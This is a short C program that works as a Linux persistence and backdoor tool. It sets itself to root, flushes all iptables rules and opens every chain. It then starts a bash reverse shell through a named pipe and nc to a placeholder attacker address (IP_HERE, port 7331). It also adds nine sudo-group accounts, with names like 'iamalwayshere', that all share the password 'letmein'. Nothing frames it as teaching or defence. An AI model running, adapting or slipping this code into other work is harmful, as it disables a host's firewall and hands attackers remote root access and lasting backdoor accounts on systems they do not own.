#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

int main(int argc, char **argv){

	setuid(0);
	setgid(0);

	system("iptables -F");
	system("iptables -t mangle -F");

	system("iptables -P INPUT ACCEPT");
	system("iptables -P OUTPUT ACCEPT");
	system("iptables -P FORWARD ACCEPT");

	system("[ ! -p /tmp/1823892 ] && mkfifo /tmp/1823892");
	system("(/bin/bash 0</tmp/1823892 | nc IP_HERE 7331 1>/tmp/1823892) &");

	// Add some users
	char *users[9] = {"devbl", "bob", "susan", "kat", "simon", "batman", 
			"iamalwayshere", "youcantgetridofme", "hehe"};

	for(int i = 0; i < 9; i++){

		if(!getpwnam(users[i])){
			
			char adduser[500];
			char setpass[500];

			sprintf(adduser, "%s%s%s", "useradd -M ", users[i], " -G sudo -s /bin/bash");
			sprintf(setpass, "%s%s%s", "echo \"", users[i], ":letmein\" | chpasswd");

			system(adduser);
			system(setpass);
		}
	}

	

	return 0;
}
